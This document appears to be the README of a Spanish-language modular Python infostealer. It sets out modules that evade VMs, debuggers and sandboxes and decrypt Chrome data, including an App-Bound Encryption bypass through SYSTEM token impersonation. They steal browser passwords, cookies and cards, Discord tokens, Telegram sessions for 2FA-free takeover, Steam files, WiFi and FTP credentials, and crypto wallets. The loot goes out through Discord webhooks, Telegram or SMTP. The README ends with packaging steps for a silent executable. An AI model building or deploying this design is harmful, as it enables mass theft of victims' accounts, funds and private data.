# MSF — InfoStealer Modular

```
Malwares/
└── InfoStealers/
    ├── main.py                ← orchestrador
    ├── dpapi.py               ← decrypt engine (DPAPI + ABE)
    ├── Anti_VM_Debug.py       ← anti-VM / anti-debug
    ├── anti_sandbox.py        ← anti-sandbox (DLL, MAC, hardware)
    ├── anti_virus_infos.py    ← detección de AV instalados
    ├── system_infos.py        ← info del sistema + IP pública
    ├── browser_steal.py       ← passwords, cookies, autofill, cards, history
    ├── discord_token.py       ← tokens, friends, guilds, DMs, billing
    ├── roblox_cookies.py      ← .ROBLOSECURITY cookies
    ├── telegram_session.py    ← tdata/ completo (sin 2FA)
    ├── steam.py               ← ssfn, loginusers.vdf, session tokens
    ├── wifi_passwords.py      ← contraseñas WiFi guardadas
    ├── filezilla.py           ← FTP creds (FileZilla, WinSCP, TotalCMD)
    ├── wallets.py             ← wallets locales (Exodus, Atomic, Electrum...)
    ├── screenshot.py          ← captura de pantalla inicial
    ├── interesting_files.py   ← sweep de archivos sensibles
    └── exfil.py               ← Discord webhook / Telegram / SMTP
```

---

## Módulos

### `main.py`
Orchestrador principal. Orden de ejecución:

| # | Módulo | Razón del orden |
|---|---|---|
| 1 | Anti-VM / Anti-Sandbox | abort inmediato si detecta entorno de análisis |
| 2 | Screenshot | captura estado real antes de que cualquier proceso lo altere |
| 3 | System Infos | baseline del sistema |
| 4 | Antivirus Infos | saber qué EDR está corriendo |
| 5 | Browser Steal | mayor volumen de datos, primero |
| 6 | Discord | tokens + harvest de cuenta |
| 7 | Roblox | cookies de sesión |
| 8 | Telegram | tdata/ completo |
| 9 | Steam | session files + ssfn |
| 10 | WiFi Passwords | netsh, no falla nunca |
| 11 | FileZilla / FTP | credenciales de servidores |
| 12 | Wallets | sweep de wallets locales |
| 13 | Interesting Files | sweep final de documentos sensibles |
| 14 | Exfil | Discord webhook → Telegram → SMTP |
| 15 | Cleanup | borra zip temporal + auto-delete |

---

### `dpapi.py`
Motor de descifrado unificado. Tres capas:

- **Legacy DPAPI** — blobs pre-Chrome 80 sin master key (`CryptUnprotectData` directo)
- **AES-GCM estándar** — Chrome 80–126 con master key de `Local State`
- **App-Bound Encryption bypass** — Chrome 127+ via token impersonation de SYSTEM (`winlogon.exe` → duplicate token → `CryptUnprotectData` bajo contexto SYSTEM)

Función pública: `decrypt_browser_value(encrypted_value, master_key)` — drop-in replacement.

---

### `Anti_VM_Debug.py`
Técnicas:

| Técnica | Qué detecta |
|---|---|
| `IsDebuggerPresent` | debugger básico (parcheable con NOP) |
| `NtQueryInformationProcess` ProcessDebugPort | debugger adjunto (más confiable) |
| `NtQueryInformationProcess` ProcessDebugFlags | flags de debug |
| RDTSC timing (shellcode) | overhead de virtualización en CPU |
| CPUID hypervisor bit EAX=1 | bit 31 ECX = hypervisor presente |
| CPUID vendor EAX=0x40000000 | vendor string: VMware / VBox / Hyper-V |
| Registry sweep | 14 keys de artifacts de VM |
| Blacklist usernames / hostnames | 30+ cada una |
| Blacklist HWIDs | 90+ UUIDs conocidos de sandboxes |
| Blacklist procesos | debuggers, RE tools, proxies |
| RAM < 3 GB / CPU ≤ 2 cores | heurística de sandbox |
| Disk < 60 GB | heurística de VM |
| Resolución < 800×600 | headless / sandbox |
| Display driver genérico | VBox/VMware sin Guest Additions |
| Boot time < 60s | sandbox recién iniciado |

---

### `anti_sandbox.py`
Complementa Anti_VM_Debug:

| Check | Método |
|---|---|
| DLL indicators | `GetModuleHandleA` sobre lista de DLLs de sandbox |
| MAC prefix | `getmac` → prefijos VMware/VBox |
| Hardware | RAM + CPU count |
| Boot time | `psutil.boot_time()` |
| Wine | `wineboot.exe` en system32 |

---

### `browser_steal.py`
Soporta 30+ browsers basados en Chromium + Firefox.

Datos extraídos:
- **Passwords** — `Login Data` → `logins` table
- **Cookies** — `Network/Cookies` → `cookies` table
- **Autofill** — `Web Data` → `autofill` + `autofill_profiles` tables
- **Tarjetas** — `Web Data` → `credit_cards` table
- **Historial** — `History` → `urls` table (500 más recientes)
- **Descargas** — `History` → `downloads` table
- **Extensiones** — crypto wallets (40+ conocidas) + desconocidas

Descifrado via `dpapi.py` — cubre legacy, estándar y Chrome 127+ ABE.

---

### `discord_token.py`
Búsqueda en Discord app (leveldb + `dQw4w9WgXcQ:` encrypted tokens) y 35+ browsers.

Por cada token válido extrae:
- Token, username, display name, ID, email, phone
- Nitro tier, MFA status, locale
- Billing (Bank Card / PayPal)
- Gift codes activos
- **Friends list** (tipo de relación + ID)
- **Guild list** (nombre, ID, admin flag via perms bitmask)
- **DMs recientes** (1:1 y group DMs, last_message_id)
- Backup codes (indica si MFA está activo para correlación con passwords)

---

### `telegram_session.py`
Roba `tdata/` completo de Telegram Desktop.

- Detecta 8 rutas de instalación (estándar, portable, Microsoft Store, Unigram)
- Detecta multi-account (sub-directorios numéricos dentro de tdata/)
- Excluye caché de medias (`.jpg`, `.mp4`, etc.) — solo session files + config
- Archivos críticos: `key_datas`, `D877F783D5D3EF8C`, archivos `.b#N`
- **Uso**: reemplazar `tdata/` en una instalación limpia de Telegram Desktop → acceso completo sin 2FA ni código de verificación

---

### `steam.py`
Targets:

| Archivo | Contenido |
|---|---|
| `ssfn*` | Steam Sentry Files — Steam Guard bypass |
| `config/loginusers.vdf` | cuentas logueadas + `RememberPassword` flag |
| `config/config.vdf` | `ConnectCache` — session tokens por SteamID |
| `userdata/<id>/config/localconfig.vdf` | config por usuario |
| Steam Web cookies | `steamLoginSecure` — sesión web |

Parsea VDF y extrae SteamID64 → SteamID3 conversion.

---

### `wifi_passwords.py`
- Método primario: `netsh wlan show profile name=X key=clear`
- Fallback: XML directo en `C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces`
- No requiere privilegios elevados para perfiles del usuario actual
- Extrae: SSID, auth type, cipher, password en texto plano

---

### `filezilla.py`
| Cliente | Método | Cifrado |
|---|---|---|
| FileZilla | `recentservers.xml` + `sitemanager.xml` | base64 (no es cifrado real) |
| WinSCP | Registry `HKCU\Software\Martin Prikryl\WinSCP 2\Sessions` + `.ini` portable | XOR con clave derivada de hostname+username (reversible) |
| Total Commander | `wcx_ftp.ini` | XOR 31 (trivial) |

---

### `wallets.py`
Wallets cubiertos:

| Wallet | Ubicación | Nota |
|---|---|---|
| Exodus | `%APPDATA%\Exodus\exodus.wallet` | seed en `passphrase.json` |
| Atomic Wallet | `%LOCALAPPDATA%\atomic\Local Storage\leveldb` | leveldb, AES-256 |
| Electrum | `%APPDATA%\Electrum\wallets` | JSON, AES-256-CBC |
| Electrum-LTC | `%APPDATA%\Electrum-LTC\wallets` | mismo formato |
| Jaxx Liberty | `%LOCALAPPDATA%\jaxx liberty\Local Storage\leveldb` | mnemonic en leveldb |
| Wasabi | `%APPDATA%\WalletWasabi\Client\Wallets` | `EncryptedSecret` en JSON |
| Sparrow | `%APPDATA%\Sparrow\wallets` | SQLite cifrado |
| Bitcoin Core | `%APPDATA%\Bitcoin\wallet.dat` | BerkeleyDB |
| Litecoin Core | `%APPDATA%\Litecoin\wallet.dat` | BerkeleyDB |
| geth Keystore | `%APPDATA%\Ethereum\keystore` | UTC-- files, scrypt |
| Coinomi | `%LOCALAPPDATA%\Coinomi\wallets` | AES-256-CBC |
| Monero GUI | `%APPDATA%\monero-project` | `.keys` cifrado |
| Trust Wallet | `%LOCALAPPDATA%\trust wallet\leveldb` | leveldb |

---

### `screenshot.py`
- Captura via **GDI BitBlt** — sin PIL/mss, solo WinAPI
- Multi-monitor via `SM_CXVIRTUALSCREEN` / `SM_CYVIRTUALSCREEN`
- Retorna BMP raw construido manualmente
- Fallback a `mss` si está instalado
- Modo intervalo: captura periódica en hilo daemon

---

### `exfil.py`
Cascada: Discord → Telegram → SMTP

| Canal | Límite | Manejo |
|---|---|---|
| Discord Webhook | 8 MB | split automático en partes `.part001`, `.part002`... |
| Telegram Bot API | 50 MB | split automático |
| SMTP (Gmail/otro) | ilimitado | archivo adjunto único |

Configura `DISCORD_WEBHOOK_URL`, `TELEGRAM_BOT_TOKEN` + `TELEGRAM_CHAT_ID`, o `SMTP_*` antes de compilar.

---

## Output ZIP — estructura de carpetas

```
hostname_20260928_143022.zip
├── Screenshots/
│   └── screenshot_initial_143022.bmp
├── system_infos.txt
├── Antivirus Info.txt
├── Passwords (N).txt
├── Cookies (N).txt
├── Autofill (N).txt
├── Cards (N).txt
├── Browsing History (N).txt
├── Downloads (N).txt
├── Extensions/
│   └── Chrome/
│       ├── Metamask/
│       └── Unknown Extension/
├── Discord Accounts (N).txt
├── Roblox Accounts (N).txt
├── Telegram/
│   ├── account_01/tdata/...
│   └── telegram_summary.txt
├── Steam/
│   ├── loginusers.vdf
│   ├── config.vdf
│   ├── ssfn/
│   └── steam_summary.txt
├── WiFi Passwords (N).txt
├── FTP/
│   ├── ftp_credentials (N).txt
│   ├── FileZilla/
│   └── WinSCP/
├── Wallets/
│   ├── Exodus/
│   ├── Atomic Wallet/
│   └── README.txt
└── Interesting Files/
```

---

## Dependencias

```
pip install requests psutil pywin32 pycryptodome cryptography browser-cookie3
```

| Package | Uso |
|---|---|
| `requests` | validación tokens, API calls, exfil |
| `psutil` | process iteration, boot time |
| `pywin32` (`win32crypt`) | `CryptUnprotectData` |
| `pycryptodome` (`Cryptodome`) | AES-GCM decrypt |
| `cryptography` | AES-GCM (capa alternativa) |
| `browser-cookie3` | Roblox cookies |

---

## Configuración antes de deploy

1. `exfil.py` — setear `DISCORD_WEBHOOK_URL` y/o `TELEGRAM_BOT_TOKEN` + `TELEGRAM_CHAT_ID`
2. Compilar con **PyInstaller**: `pyinstaller --onefile --noconsole --hidden-import=... main.py`
3. UPX para reducir tamaño del exe: `pyinstaller ... --upx-dir=./upx`
